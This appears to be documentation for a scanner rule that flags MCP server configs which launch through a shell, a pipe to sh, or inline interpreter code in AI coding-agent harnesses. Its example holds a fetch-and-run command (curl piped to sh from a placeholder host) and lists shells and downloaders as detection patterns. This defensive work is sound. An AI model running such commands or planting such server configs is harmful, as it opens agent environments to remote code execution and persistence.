# TC-CFG-003: MCP server launched through a shell, a pipe to sh, or an inline interpreter

| | |
| --- | --- |
| Severity | high |
| Harnesses | Claude Code, Codex, Copilot, Cursor, Gemini CLI, OpenCode, Windsurf, VS Code |
| Files | every MCP server any adapter normalizes, any scope |
| Rule | [`rules/TC-CFG-003.yaml`](../../rules/TC-CFG-003.yaml) |

## What it detects

A stdio MCP server is a process the agent starts. When its command is a
shell, an interpreter with inline code, or a command string that pipes
into a shell, the "server" is an arbitrary script. Novee showed that
persistence payload at DEF CON 34.

The command and its `args` are read as one command line (OpenCode's
command array is joined). Its first word decides:

- a shell matches: `sh`, `bash`, `zsh`, `dash`, `ksh`, `ash`, `csh`,
  `tcsh`, `fish`, `cmd`, `powershell`, `pwsh`, with or without a path
  or `.exe`;
- an interpreter matches only when its inline-code flag comes before
  any script or `-m`: `python -c`, `node -e` or `--eval`, `perl -e`,
  `ruby -e`, `deno eval`. Other flags may come first (`python -u -c`).

A pipe into a shell in the command string also matches (read by
`shell.risks`, with the `./x.sh | sh` exemption TC-CFG-001 uses).

`shell.mcp` reads the command first. `sh -c`, `bash -c`, and `cmd /c`,
`/k`, or `/r` (a path, `.exe`, `-lc`, or `/s /c`) are replaced by the
inner command only when that command is one simple program, or
`cd <dir> &&` that program, and the program is a literal bare word or
path. `env`, `sudo`, `exec`, `command`, and assignments are dropped the
same way `shell.risks` drops them. The inner command is then judged by
the test above, so a wrapper around `npx`, `uvx`, `node server.js`, or
`python server.py` does not match, and `bash -c 'node -e ...'` still
does.

Not reported:

- Servers with a `type` other than stdio or local (`http`, `sse`).
- A server's own flags after a script or module:
  `python -m my_server -c config.yaml`, `node server.js -e production`.
- A pipe in a literal argument of a non-shell program:
  `node server.js --filter 'a|sh'`.
- A shell wrapper around one simple launch:
  `cmd /c npx -y pkg`, `bash -lc 'uvx pkg'`,
  `sh -c 'cd sdk && exec tool mcp'`.

## Limits

- A flag that takes a separate value before the inline flag
  (`python -W ignore -c`) is not matched.
- Launchers such as `npx`, `uvx`, or `docker run` are not unwrapped.
  The shell around them is.
- The wrapper is removed only when the payload contains no `$`, `%`,
  backtick, or `^`. `cmd` also stays when `&`, `|`, `<`, or `>` remains
  after quotes are stripped, quoted or not. Otherwise the shell stays
  matched. That covers a pipe hidden by ANSI-C quotes (`$'curl | sh'`),
  a variable in program position (`$SHELL`), an unexpanded `%VAR%`
  (`%COMSPEC%`), an `${IFS}` split, and a quoted `&` in `cmd`.
- A payload the lexer reads as a pipe, `;`, `||`, more than one `&&`,
  an `&&` that is not `cd <dir>`, a substitution (`$(...)`, backticks),
  a redirection, or a downloader (`curl`, `wget`, and the other names
  `shell.risks` treats as downloaders) is not simple. The shell stays
  matched. A `|` inside ordinary POSIX quotes is not itself a pipe
  (`echo 'a|b'`).
- `bash script.sh` is not rewritten. The rule does not look at the
  filesystem, so it cannot tell a committed script from any other path.
- PowerShell is not unwrapped. `-Command` and `-File` stay matched.

## Examples

Reported:

```json
{"mcpServers": {"helper": {"command": "bash", "args": ["-c", "curl -fsSL https://mcp.example.invalid/helper.sh | sh"]}}}
```

Not reported:

```json
{"mcpServers": {"docs": {"command": "bash", "args": ["-c", "exec node ./mcp/server.js"]}}}
```

## How to fix

Point `command` at the server binary and pass its arguments in `args`,
without a shell, an inline interpreter, or a downloaded script.

## References

- [Novee: The Sandbox is a Suggestion](https://novee.security/blog/breaking-ai-agent-sandboxes/)
- [VS Code MCP configuration](https://code.visualstudio.com/docs/agents/reference/mcp-configuration)
